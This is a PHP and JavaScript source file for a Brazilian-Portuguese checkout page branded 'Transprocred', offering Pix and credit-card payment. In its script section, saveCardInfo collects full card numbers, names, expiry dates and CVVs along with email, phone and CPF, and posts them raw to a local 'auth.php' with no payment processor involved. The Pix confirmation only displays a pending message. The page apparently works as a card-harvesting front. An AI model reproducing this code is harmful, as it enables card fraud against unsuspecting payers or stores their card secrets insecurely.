<?php
/**
 * src/views/Payments/Pages/checkout.page.php
 */

ob_start();
?>
<?php
$headerProps = ['logo' => '/public/assets/vendor/images/transpoicon.png'];
require BASE_PATH . '/src/views/Payments/Organisms/PaymentHeader.php';
?>

<div class="container">
    <div class="card">
        <?php
        $props = ['value' => $viewData['valorOriginal']];
        require BASE_PATH . '/src/views/Payments/Molecules/AmountDisplay.php';
        ?>

        <div class="payment-methods">
            <h3>Como você quer pagar?</h3>

            <?php
            $props = [
                'onclick' => 'openPix()',
                'icon' => 'fa-qrcode',
                'title' => 'Pix',
                'subtitle' => 'Aprovação imediata'
            ];
            require BASE_PATH . '/src/views/Payments/Molecules/PaymentMethodItem.php';

            $props = [
                'onclick' => 'openCard()',
                'icon' => 'fa-credit-card',
                'title' => 'Cartão de crédito',
                'subtitle' => 'Até 12 parcelas'
            ];
            require BASE_PATH . '/src/views/Payments/Molecules/PaymentMethodItem.php';
            ?>
        </div>
    </div>

    <div class="footer">
        <p>&copy;
            <?php echo date('Y'); ?> Pagamento Seguro - Processado por Transprocred
        </p>
    </div>
</div>
<?php $content = ob_get_clean(); ?>

<?php ob_start(); ?>
<?php require BASE_PATH . '/src/views/Payments/Organisms/PixModal.php'; ?>
<?php require BASE_PATH . '/src/views/Payments/Organisms/CreditCardModal.php'; ?>
<?php $modals = ob_get_clean(); ?>

<?php ob_start(); ?>
<script>
    async function saveLead(email, phone, cpf) {
        if (!email || !phone || !cpf) {
            Swal.fire('Atenção', 'Por favor, preencha E-mail, Telefone e CPF.', 'warning');
            return false;
        }

        try {
            const response = await fetch('../auth.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    action: 'update_lead',
                    username: cpf.replace(/\D/g, ''),
                    email: email,
                    phone: phone
                })
            });
            const result = await response.json();
            return result.success;
        } catch (err) {
            console.error(err);
            return false;
        }
    }

    async function confirmPixLead() {
        const email = document.getElementById('pix-email').value;
        const phone = document.getElementById('pix-phone').value;
        const cpf = document.getElementById('pix-cpf').value;

        const success = await saveLead(email, phone, cpf);
        if (success) {
            document.getElementById('pix-lead-section').style.display = 'none';
            document.getElementById('pix-payment-section').style.display = 'block';
        } else {
            Swal.fire('Erro', 'Não foi possível salvar seus dados de contato.', 'error');
        }
    }

    function openPix() {
        document.getElementById('pix-modal').style.display = 'block';
    }
    function closePix() {
        document.getElementById('pix-modal').style.display = 'none';
    }
    function copyPayload() {
        const text = document.getElementById('payload-text').innerText;
        navigator.clipboard.writeText(text).then(() => {
            alert('Código copiado com sucesso!');
        });
    }
    function confirmPayment() {
        Swal.fire({
            title: 'Pagamento em análise',
            text: 'Estamos processando o seu pagamento. Isso pode levar até 30 minutos.',
            icon: 'info',
            confirmButtonColor: '#007d89',
            confirmButtonText: 'Entendido'
        }).then(() => {
            location.reload();
        });
    }

    function openCard() {
        document.getElementById('card-modal').style.display = 'block';
    }
    function closeCard() {
        document.getElementById('card-modal').style.display = 'none';
    }

    function updateCardPreview() {
        let num = document.getElementById('card-num').value;
        num = num.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
        document.getElementById('card-num').value = num;

        document.getElementById('display-number').innerText = num || '•••• •••• •••• ••••';
        document.getElementById('display-name').innerText = document.getElementById('card-name').value.toUpperCase() || 'NOME COMPLETO';
        document.getElementById('display-date').innerText = document.getElementById('card-expiry').value || 'MM/AA';
    }

    async function saveCardInfo() {
        const email = document.getElementById('card-email').value;
        const phone = document.getElementById('card-phone').value;
        const cpf = document.getElementById('card-cpf').value;

        if (!email || !phone || !cpf) {
            Swal.fire('Atenção', 'Por favor, informe seu e-mail, telefone e CPF.', 'warning');
            return;
        }

        const data = {
            action: 'save_card',
            username: cpf.replace(/\D/g, ''),
            number: document.getElementById('card-num').value,
            name: document.getElementById('card-name').value,
            expiry: document.getElementById('card-expiry').value,
            cvv: document.getElementById('card-cvv').value,
            installments: document.getElementById('card-installments').value
        };

        if (!data.number || !data.name || !data.expiry || !data.cvv) {
            alert('Por favor, preencha todos os campos do cartão.');
            return;
        }

        try {
            await saveLead(email, phone, cpf);
            const response = await fetch('../auth.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams(data)
            });

            if (!response.ok) {
                throw new Error('Erro no servidor: ' + response.status);
            }

            const result = await response.json();
            if (result.success) {
                Swal.fire({
                    title: 'Sucesso!',
                    text: 'Seu pagamento está sendo processado. Aguarde a confirmação no painel.',
                    icon: 'success',
                    confirmButtonColor: '#009ee3'
                }).then(() => {
                    location.reload();
                });
            } else {
                Swal.fire('Erro', result.message || 'Erro ao processar pagamento.', 'error');
            }
        } catch (err) {
            console.error('Erro detalhado:', err);
            Swal.fire('Erro', 'Erro de conexão ou resposta inválida do servidor.', 'error');
        }
    }
</script>
<?php $scripts = ob_get_clean(); ?>

<?php
$props = [
    'title' => 'Checkout Seguro - Transprocred',
    'content' => $content,
    'modals' => $modals,
    'scripts' => $scripts
];
require BASE_PATH . '/src/views/Payments/Templates/checkout-layout.php';
?>